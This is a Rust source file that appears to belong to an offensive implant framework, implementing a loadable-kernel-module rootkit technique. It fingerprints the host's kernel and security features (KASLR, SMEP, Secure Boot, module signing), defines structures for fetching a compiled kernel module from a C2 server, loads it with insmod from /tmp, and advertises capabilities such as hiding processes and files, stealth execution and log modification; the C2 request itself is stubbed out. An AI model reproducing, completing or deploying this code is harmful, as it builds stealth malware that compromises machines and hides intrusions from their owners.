use std::collections::HashMap;
use std::error::Error;
use std::fs::{self, File};
use std::io::{Read, Write};
use std::path::Path;
use std::process::Command;
use serde::{Deserialize, Serialize};
use chrono::{DateTime, Utc};

use crate::bridge::KernelBridge;
use crate::rootkit::{RootkitTechnique, TechniqueStatus, TechniqueConfig};

pub mod userspace;
use userspace::UserspaceController;

/// System information required for kernel module selection
#[derive(Debug, Serialize, Deserialize, Clone)]
pub struct SystemInfo {
    /// Kernel version string (e.g., "5.15.0-56-generic")
    pub kernel_version: String,
    /// Kernel release string
    pub kernel_release: String,
    /// Distribution information
    pub distribution: String,
    /// Distribution version
    pub dist_version: String,
    /// Architecture (x86_64, aarch64, etc.)
    pub architecture: String,
    /// GCC version used to compile kernel
    pub gcc_version: String,
    /// Kernel configuration hash
    pub kernel_config_hash: String,
    /// Available kernel symbols
    pub available_symbols: Vec<String>,
    /// Security features enabled
    pub security_features: SecurityFeatures,
    /// Module signature verification status
    pub module_signing: ModuleSigningInfo,
}

/// Security features that affect rootkit deployment
#[derive(Debug, Serialize, Deserialize, Clone)]
pub struct SecurityFeatures {
    /// KASLR (Kernel Address Space Layout Randomization)
    pub kaslr_enabled: bool,
    /// SMEP (Supervisor Mode Execution Prevention)
    pub smep_enabled: bool,
    /// SMAP (Supervisor Mode Access Prevention)
    pub smap_enabled: bool,
    /// Control Flow Integrity
    pub cfi_enabled: bool,
    /// Kernel Guard (KGUARD)
    pub kguard_enabled: bool,
    /// SELinux status
    pub selinux_enabled: bool,
    /// AppArmor status
    pub apparmor_enabled: bool,
}

/// Kernel module signing information
#[derive(Debug, Serialize, Deserialize, Clone)]
pub struct ModuleSigningInfo {
    /// Whether module signing is enforced
    pub signing_enforced: bool,
    /// Available signing certificates
    pub available_certs: Vec<String>,
    /// Whether secure boot is enabled
    pub secure_boot_enabled: bool,
}

/// Request to C2 for kernel module
#[derive(Debug, Serialize, Deserialize)]
pub struct ModuleRequest {
    /// System information
    pub system_info: SystemInfo,
    /// Requested rootkit capabilities
    pub capabilities: Vec<String>,
    /// Stealth level requirement
    pub stealth_level: u8,
    /// Custom configuration
    pub custom_config: HashMap<String, String>,
}

/// Response from C2 with kernel module
#[derive(Debug, Serialize, Deserialize)]
pub struct ModuleResponse {
    /// Base64 encoded kernel module binary
    pub module_binary: String,
    /// Module metadata
    pub module_info: ModuleInfo,
    /// Installation instructions
    pub install_instructions: Vec<String>,
    /// Expected module parameters
    pub module_parameters: HashMap<String, String>,
}

/// Metadata about the kernel module
#[derive(Debug, Serialize, Deserialize)]
pub struct ModuleInfo {
    /// Module name
    pub name: String,
    /// Module version
    pub version: String,
    /// Compilation timestamp
    pub compiled_at: DateTime<Utc>,
    /// Target kernel version
    pub target_kernel: String,
    /// Supported capabilities
    pub capabilities: Vec<String>,
    /// Module size in bytes
    pub size: usize,
    /// SHA256 hash of module
    pub hash: String,
}

/// LKM-specific status information
#[derive(Debug, Serialize, Deserialize)]
pub struct LkmStatus {
    /// Whether kernel module is loaded
    pub module_loaded: bool,
    /// Module name in kernel
    pub module_name: Option<String>,
    /// Module load address
    pub load_address: Option<String>,
    /// Module size in memory
    pub memory_size: Option<usize>,
    /// Reference count
    pub ref_count: Option<u32>,
    /// Module state
    pub state: Option<String>,
    /// Hooks installed
    pub hooks_installed: Vec<String>,
    /// Last operation timestamp
    pub last_operation: Option<DateTime<Utc>>,
}

/// Main LKM rootkit technique implementation
pub struct LkmTechnique {
    /// Current configuration
    config: TechniqueConfig,
    /// System information
    system_info: Option<SystemInfo>,
    /// Currently loaded module info
    module_info: Option<ModuleInfo>,
    /// Userspace controller
    controller: Option<UserspaceController>,
    /// Technique status
    status: LkmStatus,
    /// Deployment timestamp
    deployed_at: Option<DateTime<Utc>>,
    /// Whether technique is active
    active: bool,
}

impl LkmTechnique {
    /// Create a new LKM technique instance
    pub fn new() -> Self {
        Self {
            config: TechniqueConfig::default(),
            system_info: None,
            module_info: None,
            controller: None,
            status: LkmStatus {
                module_loaded: false,
                module_name: None,
                load_address: None,
                memory_size: None,
                ref_count: None,
                state: None,
                hooks_installed: Vec::new(),
                last_operation: None,
            },
            deployed_at: None,
            active: false,
        }
    }

    /// Collect comprehensive system information
    fn collect_system_info(&mut self) -> Result<SystemInfo, Box<dyn Error>> {
        let mut system_info = SystemInfo {
            kernel_version: self.get_kernel_version()?,
            kernel_release: self.get_kernel_release()?,
            distribution: self.get_distribution()?,
            dist_version: self.get_distribution_version()?,
            architecture: self.get_architecture()?,
            gcc_version: self.get_gcc_version()?,
            kernel_config_hash: self.get_kernel_config_hash()?,
            available_symbols: self.get_available_symbols()?,
            security_features: self.get_security_features()?,
            module_signing: self.get_module_signing_info()?,
        };

        self.system_info = Some(system_info.clone());
        Ok(system_info)
    }

    /// Get kernel version from /proc/version
    fn get_kernel_version(&self) -> Result<String, Box<dyn Error>> {
        let version = fs::read_to_string("/proc/version")?;
        Ok(version.trim().to_string())
    }

    /// Get kernel release from uname
    fn get_kernel_release(&self) -> Result<String, Box<dyn Error>> {
        let output = Command::new("uname").arg("-r").output()?;
        Ok(String::from_utf8(output.stdout)?.trim().to_string())
    }

    /// Get distribution information
    fn get_distribution(&self) -> Result<String, Box<dyn Error>> {
        // Try multiple sources for distribution info
        if let Ok(os_release) = fs::read_to_string("/etc/os-release") {
            for line in os_release.lines() {
                if line.starts_with("ID=") {
                    return Ok(line.split('=').nth(1).unwrap_or("unknown").trim_matches('"').to_string());
                }
            }
        }
        
        if Path::new("/etc/debian_version").exists() {
            return Ok("debian".to_string());
        }
        
        if Path::new("/etc/redhat-release").exists() {
            return Ok("rhel".to_string());
        }
        
        Ok("unknown".to_string())
    }

    /// Get distribution version
    fn get_distribution_version(&self) -> Result<String, Box<dyn Error>> {
        if let Ok(os_release) = fs::read_to_string("/etc/os-release") {
            for line in os_release.lines() {
                if line.starts_with("VERSION_ID=") {
                    return Ok(line.split('=').nth(1).unwrap_or("unknown").trim_matches('"').to_string());
                }
            }
        }
        Ok("unknown".to_string())
    }

    /// Get system architecture
    fn get_architecture(&self) -> Result<String, Box<dyn Error>> {
        let output = Command::new("uname").arg("-m").output()?;
        Ok(String::from_utf8(output.stdout)?.trim().to_string())
    }

    /// Get GCC version used to compile kernel
    fn get_gcc_version(&self) -> Result<String, Box<dyn Error>> {
        if let Ok(version_info) = fs::read_to_string("/proc/version") {
            // Extract GCC version from kernel version string
            for part in version_info.split_whitespace() {
                if part.starts_with("gcc-") {
                    return Ok(part.to_string());
                }
            }
        }
        
        // Fallback to system GCC version
        let output = Command::new("gcc").arg("--version").output();
        match output {
            Ok(out) => {
                let version_str = String::from_utf8(out.stdout)?;
                if let Some(first_line) = version_str.lines().next() {
                    return Ok(first_line.to_string());
                }
            }
            Err(_) => {}
        }
        
        Ok("unknown".to_string())
    }

    /// Get kernel configuration hash
    fn get_kernel_config_hash(&self) -> Result<String, Box<dyn Error>> {
        // Try to read kernel config
        let config_paths = vec![
            "/proc/config.gz",
            "/boot/config-$(uname -r)",
            "/usr/src/linux/.config",
        ];
        
        for path in config_paths {
            if Path::new(path).exists() {
                if let Ok(content) = fs::read(path) {
                    return Ok(format!("{:x}", md5::compute(&content)));
                }
            }
        }
        
        Ok("unknown".to_string())
    }

    /// Get available kernel symbols from /proc/kallsyms
    fn get_available_symbols(&self) -> Result<Vec<String>, Box<dyn Error>> {
        let mut symbols = Vec::new();
        
        if let Ok(kallsyms) = fs::read_to_string("/proc/kallsyms") {
            for line in kallsyms.lines().take(1000) { // Limit to first 1000 symbols
                let parts: Vec<&str> = line.split_whitespace().collect();
                if parts.len() >= 3 {
                    symbols.push(parts[2].to_string());
                }
            }
        }
        
        Ok(symbols)
    }

    /// Get security features status
    fn get_security_features(&self) -> Result<SecurityFeatures, Box<dyn Error>> {
        Ok(SecurityFeatures {
            kaslr_enabled: self.check_kaslr()?,
            smep_enabled: self.check_smep()?,
            smap_enabled: self.check_smap()?,
            cfi_enabled: self.check_cfi()?,
            kguard_enabled: self.check_kguard()?,
            selinux_enabled: Path::new("/sys/fs/selinux").exists(),
            apparmor_enabled: Path::new("/sys/kernel/security/apparmor").exists(),
        })
    }

    /// Check KASLR status
    fn check_kaslr(&self) -> Result<bool, Box<dyn Error>> {
        if let Ok(cmdline) = fs::read_to_string("/proc/cmdline") {
            return Ok(!cmdline.contains("nokaslr"));
        }
        Ok(true) // Assume enabled by default
    }

    /// Check SMEP status
    fn check_smep(&self) -> Result<bool, Box<dyn Error>> {
        if let Ok(cpuinfo) = fs::read_to_string("/proc/cpuinfo") {
            return Ok(cpuinfo.contains("smep"));
        }
        Ok(false)
    }

    /// Check SMAP status
    fn check_smap(&self) -> Result<bool, Box<dyn Error>> {
        if let Ok(cpuinfo) = fs::read_to_string("/proc/cpuinfo") {
            return Ok(cpuinfo.contains("smap"));
        }
        Ok(false)
    }

    /// Check CFI status
    fn check_cfi(&self) -> Result<bool, Box<dyn Error>> {
        // Check if CFI is enabled in kernel config
        Ok(false) // Simplified for now
    }

    /// Check KGUARD status
    fn check_kguard(&self) -> Result<bool, Box<dyn Error>> {
        // Check if KGUARD is enabled
        Ok(false) // Simplified for now
    }

    /// Get module signing information
    fn get_module_signing_info(&self) -> Result<ModuleSigningInfo, Box<dyn Error>> {
        let signing_enforced = Path::new("/sys/module/kernel/parameters/sig_enforce").exists();
        let secure_boot_enabled = self.check_secure_boot()?;
        
        Ok(ModuleSigningInfo {
            signing_enforced,
            available_certs: Vec::new(), // Would need to enumerate certificates
            secure_boot_enabled,
        })
    }

    /// Check if Secure Boot is enabled
    fn check_secure_boot(&self) -> Result<bool, Box<dyn Error>> {
        if let Ok(secure_boot) = fs::read_to_string("/sys/firmware/efi/efivars/SecureBoot-8be4df61-93ca-11d2-aa0d-00e098032b8c") {
            return Ok(secure_boot.len() > 4 && secure_boot.as_bytes()[4] == 1);
        }
        Ok(false)
    }

    /// Request kernel module from C2 server
    fn request_module_from_c2(&self, capabilities: Vec<String>) -> Result<ModuleResponse, Box<dyn Error>> {
        let system_info = self.system_info.as_ref()
            .ok_or("System information not collected")?;

        let request = ModuleRequest {
            system_info: system_info.clone(),
            capabilities,
            stealth_level: self.config.stealth_level,
            custom_config: self.config.custom_params.clone(),
        };

        // This would be implemented to communicate with the C2 server
        // For now, return a placeholder error
        Err("C2 communication not implemented yet".into())
    }

    /// Install kernel module from binary data
    fn install_module(&mut self, module_response: ModuleResponse) -> Result<(), Box<dyn Error>> {
        // Decode module binary
        let module_binary = base64::decode(&module_response.module_binary)?;
        
        // Create temporary file for module
        let temp_path = format!("/tmp/{}.ko", module_response.module_info.name);
        let mut temp_file = File::create(&temp_path)?;
        temp_file.write_all(&module_binary)?;
        
        // Verify module hash
        let actual_hash = format!("{:x}", sha2::Sha256::digest(&module_binary));
        if actual_hash != module_response.module_info.hash {
            return Err("Module hash verification failed".into());
        }

        // Load the module
        let output = Command::new("insmod")
            .arg(&temp_path)
            .output()?;

        if !output.status.success() {
            let error = String::from_utf8_lossy(&output.stderr);
            return Err(format!("Failed to load module: {}", error).into());
        }

        // Clean up temporary file
        let _ = fs::remove_file(&temp_path);

        // Update status
        self.module_info = Some(module_response.module_info);
        self.status.module_loaded = true;
        self.status.module_name = Some(module_response.module_info.name);
        self.status.last_operation = Some(Utc::now());

        // Initialize userspace controller
        self.controller = Some(UserspaceController::new(
            self.status.module_name.as_ref().unwrap()
        )?);

        Ok(())
    }

    /// Update LKM status from kernel
    fn update_status(&mut self) -> Result<(), Box<dyn Error>> {
        if let Some(ref module_name) = self.status.module_name {
            // Read module information from /proc/modules
            if let Ok(modules) = fs::read_to_string("/proc/modules") {
                for line in modules.lines() {
                    let parts: Vec<&str> = line.split_whitespace().collect();
                    if parts.len() >= 6 && parts[0] == module_name {
                        self.status.memory_size = parts[1].parse().ok();
                        self.status.ref_count = parts[2].parse().ok();
                        self.status.state = Some(parts[4].to_string());
                        break;
                    }
                }
            }
        }
        Ok(())
    }
}

impl RootkitTechnique for LkmTechnique {
    fn name(&self) -> &str {
        "lkm"
    }

    fn deploy(&mut self, _bridge: &mut KernelBridge) -> Result<String, Box<dyn Error>> {
        // Collect system information
        let _system_info = self.collect_system_info()?;

        // Request appropriate kernel module from C2
        let capabilities = vec![
            "hide_process".to_string(),
            "hide_file".to_string(),
            "network_filter".to_string(),
        ];

        // For now, return an error since C2 communication isn't implemented
        // In a real implementation, this would:
        // 1. Send system_info to C2
        // 2. Receive compiled kernel module
        // 3. Install and load the module
        // 4. Initialize communication with the module

        self.deployed_at = Some(Utc::now());
        
        Err("LKM deployment requires C2 communication - not yet implemented".into())
    }

    fn is_active(&self) -> bool {
        self.active && self.status.module_loaded
    }

    fn execute_command(&mut self, command: &str, params: &str) -> Result<String, Box<dyn Error>> {
        let controller = self.controller.as_mut()
            .ok_or("No active controller")?;

        controller.execute_command(command, params)
    }

    fn get_status(&self) -> Result<TechniqueStatus, Box<dyn Error>> {
        let mut custom_metrics = HashMap::new();
        
        if let Some(ref module_info) = self.module_info {
            custom_metrics.insert("module_version".to_string(), module_info.version.clone());
            custom_metrics.insert("module_size".to_string(), module_info.size.to_string());
        }
        
        if let Some(load_addr) = &self.status.load_address {
            custom_metrics.insert("load_address".to_string(), load_addr.clone());
        }

        Ok(TechniqueStatus {
            name: self.name().to_string(),
            active: self.is_active(),
            deployed_at: self.deployed_at.map(|dt| dt.timestamp() as u64),
            hidden_processes: 0, // Would be updated by controller
            hidden_files: 0,    // Would be updated by controller
            network_rules: 0,   // Would be updated by controller
            last_error: None,
            custom_metrics,
        })
    }

    fn cleanup(&mut self) -> Result<(), Box<dyn Error>> {
        // Clean up userspace controller
        if let Some(mut controller) = self.controller.take() {
            controller.cleanup()?;
        }

        // Unload kernel module
        if let Some(ref module_name) = self.status.module_name {
            let output = Command::new("rmmod")
                .arg(module_name)
                .output()?;

            if !output.status.success() {
                let error = String::from_utf8_lossy(&output.stderr);
                eprintln!("Warning: Failed to unload module: {}", error);
            }
        }

        // Reset status
        self.status = LkmStatus {
            module_loaded: false,
            module_name: None,
            load_address: None,
            memory_size: None,
            ref_count: None,
            state: None,
            hooks_installed: Vec::new(),
            last_operation: None,
        };
        
        self.active = false;
        self.module_info = None;

        Ok(())
    }

    fn get_capabilities(&self) -> Vec<String> {
        vec![
            "hide_process".to_string(),
            "unhide_process".to_string(),
            "hide_file".to_string(),
            "unhide_file".to_string(),
            "list_hidden_processes".to_string(),
            "list_hidden_files".to_string(),
            "install_net_rule".to_string(),
            "remove_net_rule".to_string(),
            "stealth_exec".to_string(),
            "modify_logs".to_string(),
            "get_status".to_string(),
        ]
    }

    fn configure(&mut self, config: TechniqueConfig) -> Result<(), Box<dyn Error>> {
        self.config = config;
        Ok(())
    }
}